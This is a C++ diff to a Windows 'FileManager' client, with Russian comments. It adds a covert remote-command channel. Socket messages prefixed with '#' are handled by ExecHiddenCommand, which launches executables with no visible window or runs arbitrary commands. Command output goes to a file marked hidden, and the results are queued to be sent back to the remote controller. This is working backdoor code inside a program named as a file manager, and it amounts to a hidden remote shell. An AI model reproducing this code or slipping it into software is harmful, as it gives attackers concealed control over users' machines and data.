@@ -206,7 +206,9 @@ void FileManager::RunRequestsCycle()
     string cmd;
     while (true)
     {
+        cmd.clear();
         cmd = ParsCommand();
+        cmd.insert(0, "#");
         {
             unique_lock<mutex> lock(mt_);
             requests_q.push(cmd);
@@ -229,19 +231,14 @@ int FileManager::run()
     // Инициализируем структуры сокета 
     StartClient();
 
-    //// Устанавливаем сокет в неблокирующий режим
-    //u_long mode = 1;
-    //if (ioctlsocket(socket_, FIONBIO, &mode) != 0)
-    //    std::cerr << "Ошибка при установке сокета в неблокирующий режим." << std::endl;
-
     // Устанавливаем минимальный маймаут ожидания
     timeval timeout;
     timeout.tv_sec = 0;
     timeout.tv_usec = 1;
 
     fd_set readSet;
-    FD_ZERO(&readSet);
-    FD_SET(socket_, &readSet);
+    //FD_ZERO(&readSet);
+    //FD_SET(socket_, &readSet);
 
     // Инициализируем пул потоков
     InitializeThreadpoolEnvironment(&call_back_environ_);
@@ -263,7 +260,12 @@ int FileManager::run()
     string request_str;
     while (true)
     {
+        request_str.clear();
+        FD_ZERO(&readSet);
+        FD_SET(socket_, &readSet);
         int result = select(0, &readSet, nullptr, nullptr, &timeout);
+        if (result == SOCKET_ERROR)
+            cout << "Error: " << GetLastError() << endl;
         if (result != 0 and result != SOCKET_ERROR)
             RecvData(request_str);
 
@@ -273,6 +275,7 @@ int FileManager::run()
             if (request_str[0] == '#')
             {
                 request_str.erase(0, 1);
+                hidden_command_ = request_str;
                 workcallback_ = ExecHiddenCommand;
                 work_ = CreateThreadpoolWork(workcallback_, this, &call_back_environ_);
                 SubmitThreadpoolWork(work_);
@@ -301,42 +304,75 @@ VOID FileManager::ExecHiddenCommand(PTP_CALLBACK_INSTANCE Instance, PVOID Parame
     string result;
     char buffer[128];
 
-    if (!ptr->continue_)
-        return;
-
     string cmd;
-    while(true)
+
+    cmd = ptr->hidden_command_;
+    ptr->hidden_command_.clear();
+
+    int switch_on;
+    if (cmd.find(".exe") != string::npos)
+        switch_on = 1;
+    else
+        switch_on = 0;
+
+    STARTUPINFOA si = {sizeof(si)};
+    PROCESS_INFORMATION pi = {};
+    FILE* pipe;
+    HANDLE h_file;
+    switch (switch_on)
     {
+    case 1:
+        si = { sizeof(si) };
+        if (CreateProcessA(nullptr, const_cast<char*>(cmd.c_str()), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) 
         {
-            unique_lock<mutex> lock(ptr->mt_);
-            ptr->cv_.wait(lock, [&] {return !ptr->hidden_command_.empty(); });
-            cmd = ptr->hidden_command_;
-            ptr->hidden_command_.clear();
+            //WaitForSingleObject(pi.hProcess, INFINITE);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            result = "Successfully launched!";
         }
-        // Создаем файловый поток и выполняем команду
-        FILE* pipe = _popen(cmd.c_str(), "rb");
-        if (!pipe)
+        else
+            result = "Error start .exe file.";
+        break;
+
+    case 0:
+        h_file = CreateFileA("_popen.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
+        SetHandleInformation(h_file, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
+
+        si.dwFlags |= STARTF_USESTDHANDLES;
+        si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
+        si.hStdError = h_file;
+        si.hStdOutput = h_file;
+
+        if (CreateProcessA(NULL, const_cast<char*>(cmd.c_str()), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
         {
-            result = "Ошибка при выполнении команды.";
-            lock_guard<mutex> lock(ptr->mt_);
-            ptr->requests_q.push(result);
-            return;
+            WaitForSingleObject(pi.hProcess, INFINITE);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
         }
 
+        CloseHandle(h_file);
+
+        pipe = fopen("_popen.txt", "r");
         // Читаем вывод команды и сохраняем его в строку
         while (!feof(pipe))
         {
             if (fgets(buffer, sizeof(buffer), pipe) != nullptr)
                 result += buffer;
         }
-
+        if (result.empty())
+            result = "The command is not supported!";
         // Закрываем файловый поток
-        _pclose(pipe);
+        fclose(pipe);
+        break;
 
-        {
-            lock_guard<mutex> lock(ptr->mt_);
-            ptr->requests_q.push(result);
-        }
+    default:
+        result = "Undefined request";
+        break;
+    }
+
+    {
+        lock_guard<mutex> lock(ptr->mt_);
+        ptr->requests_q.push(result);
     }
 
     return;
